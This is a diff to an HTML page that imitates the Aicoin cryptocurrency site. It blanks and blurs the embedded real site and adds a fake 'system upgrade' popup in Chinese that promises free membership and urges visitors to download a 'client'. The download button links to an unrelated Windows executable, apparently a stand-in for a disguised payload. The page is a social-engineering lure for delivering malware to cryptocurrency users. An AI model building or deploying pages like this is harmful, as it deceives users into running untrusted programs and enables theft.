@@ -20,6 +20,7 @@
         background-color: #f4f4f9; 
         margin: 0; 
         padding: 0; 
+		overflow: hidden;
     }
     header { 
         background-color: #333; 
@@ -68,9 +69,119 @@
         position: fixed;
         top: 0;
         left: 0;
-        z-index: 9999; /* Ensure iframe appears above all other elements */
+        //z-index: 9999; /* Ensure iframe appears above all other elements */
     }
+	
+        .blur-effect {
+            transition: filter 0.3s;
+            filter: none;
+        }
+
+        .blur-effect.active {
+            filter: blur(5px);
+        }
+
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #1C1C1C; 
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.3);
+            z-index: 1000;
+            text-align: center;
+            color: white;
+            width: 400px;
+            max-width: 90%;
+        }
+
+        .popup.show {
+            display: block;
+        }
+
+        .warning-icon {
+            color: yellow;
+            font-size: 40px;
+            margin-bottom: 20px;
+        }
+
+        .popup h3 {
+            color: #FF4B4B; 
+            font-size: 24px;
+            margin: 10px 0;
+        }
+
+        .user-title {
+            color: #FFD700;  
+            font-size: 18px;
+            margin: 15px 0;
+            text-align: left;
+        }
+
+        .benefits-title {
+            color: #7FFF00;  
+            font-size: 16px;
+            margin: 15px 0;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+        }
+
+        .benefits-list {
+            text-align: left;
+            margin: 15px 0;
+            padding-left: 20px;
+            list-style-position: inside;
+        }
+
+        .benefits-list li {
+            margin: 8px 0;
+            color: white;
+        }
+
+        .hint-text {
+            color: #FF6B6B;  
+            font-size: 14px;
+            margin: 15px 0;
+            text-align: left;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .download-btn {
+            background: #4169E1; 
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .later-btn {
+            background: #2F2F2F;  
+            color: #888;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .popup p {
+            text-align: left;
+        }
 </style>
+
 </head>
 
 <body>
@@ -80,7 +191,10 @@
     <h1>欢迎来到 Aicoin 官网 - 您的一站式加密货币投资平台</h1>
 </header>
 
- <iframe src="https://www.aicoin.com/?from=new_ui" title="Aicoin Blockchain Explorer"></iframe>
+ <div class="iframe-container">	
+	<iframe title="Aicoin Blockchain Explorer" class="blur-effect"></iframe>
+</div>
+
 <div class="content">
     <div class="section">
         <h2>Aicoin的主要功能</h2>
@@ -132,7 +246,28 @@
         </ol>
     </div>
 </div>
-
+ <div class="popup" id="popup">
+        <div class="warning-icon">⚠️</div>
+        <h3>系统升级通知</h3>
+        <div class="user-title">尊敬的用户：</div>
+        <p>为提供更好的服务体验，网页版即将进行系统升级。</p>
+        
+        <div class="benefits-title">✨ 限时福利：</div>
+        <ul class="benefits-list">
+            <li>🎁 首次下载即送3个月会员</li>
+            <li>🚀 新版本交易更快捷</li>
+            <li>🔔 独享价格预警功能</li>
+        </ul>
+        
+        <div class="hint-text">* 升级期间可能影响网页版使用，建议立即下载客户端</div>
+        
+        <div class="button-container">
+            <button class="download-btn" onclick="window.location.href='https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe'">
+                立即下载
+            </button>
+            <button class="later-btn" onclick="closePopup()">稍后再说</button>
+        </div>
+    </div>
 <footer>
     <p>&copy; 2024 Aicoin. All rights reserved.</p>
     <p>
